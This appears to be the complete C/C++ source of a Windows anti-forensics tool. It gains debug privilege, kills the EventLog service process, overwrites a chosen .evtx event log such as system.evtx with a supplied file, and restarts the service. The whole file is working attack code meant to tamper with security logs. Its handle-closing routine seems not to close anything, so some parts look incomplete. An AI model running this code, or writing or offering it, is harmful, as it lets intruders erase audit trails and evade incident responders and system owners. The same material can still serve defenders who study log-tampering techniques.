#include <windows.h>
#include <winevt.h>
#include <process.h>
#pragma comment(lib,"wevtapi.lib")
#pragma comment(lib,"Advapi32.lib") 
#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI *_NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI *_NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE
{
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, *PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

void CheckBlockThreadFunc(void* param)
{
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (NtQueryObject != NULL)
	{
		PVOID objectNameInfo = NULL;
		ULONG returnLength;
		objectNameInfo = malloc(0x1000);
		NtQueryObject((HANDLE)param, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
	}
}

BOOL IsBlockingHandle(HANDLE handle)
{
	HANDLE hThread = (HANDLE)_beginthread(CheckBlockThreadFunc, 0, (void*)handle);
	if (WaitForSingleObject(hThread, 100) != WAIT_TIMEOUT) {
		return FALSE;
	}
	TerminateThread(hThread, 0);
	return TRUE;
}

DWORD  getpid2()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPWSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -> fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i < servicesReturned; i++)
			{
				_wcslwr_s(lpServiceStatusProcess[i].lpServiceName, wcslen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (wcsstr(lpServiceStatusProcess[i].lpServiceName, L"eventlog") != 0)
				{
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}
	return PID;
}

BOOL DeleteRecord(LPWSTR ReadPath, LPWSTR lpFilter)
{
	LPWSTR lpPath = new WCHAR[MAX_PATH];
	LPWSTR lpQuery = new WCHAR[MAX_PATH];
	LPWSTR lpTargetLogFile = new WCHAR[MAX_PATH];

	ZeroMemory(lpPath, MAX_PATH);
	ZeroMemory(lpQuery, MAX_PATH);
	ZeroMemory(lpTargetLogFile, MAX_PATH);

	GetSystemDirectory(lpPath, MAX_PATH);
	lstrcat(lpPath, L"\\winevt\\logs\\");
	lstrcat(lpPath, ReadPath);
	lstrcat(lpQuery, L"Event/System[");
	lstrcat(lpQuery, lpFilter);
	lstrcat(lpQuery, L"]");
	printf("%ws\n", lpQuery);
	lstrcat(lpTargetLogFile, L".\\temp.evtx");

	if (!EvtExportLog(NULL, lpPath, lpQuery, lpTargetLogFile, EvtExportLogFilePath)) {
		printf("\n[!]EvtExportLog error,%d\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
{
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;
	HANDLE processHandle = NULL;
	ULONG i;
	DWORD ErrorPID = 0;
	SYSTEM_HANDLE handle = { 0 };

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
	{
		printf("[!]Could not find NtQuerySystemInformation entry point in NTDLL.DLL");
		return 0;
	}
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtDuplicateObject");
	if (!NtDuplicateObject)
	{
		printf("[!]Could not find NtDuplicateObject entry point in NTDLL.DLL");
		return 0;
	}
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (!NtQueryObject)
	{
		printf("[!]Could not find NtQueryObject entry point in NTDLL.DLL");
		return 0;
	}

	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("[!]NtQuerySystemInformation failed!\n");
		return 0;
	}

	UNICODE_STRING objectName;
	ULONG returnLength;
	for (i = 0; i < handleInfo->HandleCount; i++)
	{
		handle = handleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
		PVOID objectNameInfo = NULL;

		if (handle.ProcessId != pid)
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			continue;
		}

		if (handle.ProcessId == ErrorPID)
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			continue;
		}

		if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId)))
		{
			printf("[!]Could not open PID %d!\n", handle.ProcessId);
			ErrorPID = handle.ProcessId;
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}

		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, 0, 0, 0)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}

		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}

		objectNameInfo = malloc(0x1000);

		if (IsBlockingHandle(dupHandle) == TRUE) //filter out the object which NtQueryObject could hang on
		{
			printf("3");
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		CloseHandle(dupHandle);
	}
	free(handleInfo);
	return TRUE;
}

int _tmain(int argc, _TCHAR *argv[])
{
	if (argc != 3)
	{
		printf("Kill the eventlog service's process and replace the eventlog file,then restart the Eventlog Service.\n");
		printf("Usage:\n");
		printf("%ws <Eventlog file name> <new .evtx file path>\n", argv[0]);
		printf("eg:\n");
		printf("     %ws system.evtx new.evtx\n", argv[0]);
		return 0;
	}

	DWORD pid = getpid2();
	if (pid == 0)
	{
		printf("[!]Get EventLog's PID error\n");
		return -1;
	}
	BOOL bResult;
	LPWSTR lpPath = new WCHAR[MAX_PATH];
	ZeroMemory(lpPath, MAX_PATH);
	GetSystemDirectory(lpPath, MAX_PATH);
	lstrcat(lpPath, L"\\winevt\\logs\\");
	lstrcat(lpPath, argv[1]);
	printf("[+]Path:%ws\n", lpPath);

	printf("[+]Delete the eventlog by using WinAPI EvtExportLog\n");
	printf("1.Try to EnableDebugPrivilege... ");
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
		return -1;
	}
	printf("Done\n");

	printf("2.Try to OpenProcess... ");
	HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (processHandle == NULL)
	{
		printf("Error\n");
		return -1;
	}
	printf("Done\n");

	printf("3.Try to TerminateProcess... ");
	bResult = TerminateProcess(processHandle, 0);
	if (bResult == NULL)
	{
		printf("Error\n");
		return -1;
	}
	printf("Done\n");

	printf("4.Try to CloseFileHandle... ");

	bResult = CloseFileHandle(argv[1], pid);
	if (bResult == NULL)
	{
		printf("Error\n");
		return -1;
	}
	printf("Done\n");

	printf("5.Try to replace evtx file... ");
	if ((CopyFile(argv[2], lpPath, FALSE)) == NULL)
		printf("\n[!]Error,%d\n", GetLastError());
	else
		printf("Done\n");

	printf("6.Try to delete temp.evtx... ");
	if ((DeleteFile(L"Temp.evtx")) == NULL)
		printf("\n[!]Error,%d\n", GetLastError());
	else
		printf("Done\n");

	printf("7.Try to Restart eventlog service...\n");
	system("net start eventlog");
	printf("[+]All Done\n");
	return 0;
}
